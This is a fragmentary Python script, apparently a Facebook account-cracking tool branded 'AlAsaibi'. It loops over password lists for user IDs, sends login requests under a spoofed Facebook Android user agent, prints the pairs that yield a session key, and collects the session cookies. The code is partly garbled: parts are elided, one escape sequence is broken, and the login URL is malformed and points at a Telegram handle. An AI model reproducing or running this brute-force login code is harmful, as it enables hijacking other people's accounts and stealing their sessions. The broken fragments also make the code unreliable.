...
def clear():
        os.system('clear')
print(f'\x1b[38;5;8m❲\x1b[1;97m=\x1b[38;5;8m❳\x1b[38;5;46m =Welcome to tool AlAsaibi ')
try:
...
\x1b[38;5;46m\x1b[38;5;854m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x4b[38;5;50m
...
\033[1;31m[\x1b[38;5;254m=\033[1;31m]  \x1b[38;5;46mVERSION \x1b[38;5;254m  ● {G1}[0.0.4] 
...
def api1(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        saad_vau = 'Dalvik/2.1.0 (Linux; U; Android 10 Build/4417; TECNO Model2) [FBAN/609.2.6.0;FBBV/669204555;FBRV/3;com.facebook.katana;FBLC/en_US;FBMF/TECNO;FBBD/TECNO;FBDV/Model2;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1333,height=739};FB_FW/3;Dalvik/2.1.0 (Linux; U; Android 11 Build/8647; TECNO KE5) [FBAN/129.4.8.0;FBBV/652874142;FBRV/3;com.facebook.katana;FBLC/en_US;FBMF/TECNO;FBBD/TECNO;FBDV/KE5;FBSV/8;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.6,width=755,height=1106};FB_FW/2;]]'
...
def rndm3(uid,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        url = 'https:// https://t.me/mo_ham_ed0_2'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{B}❲{G}Al-Asaibi-OK{B}❳{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
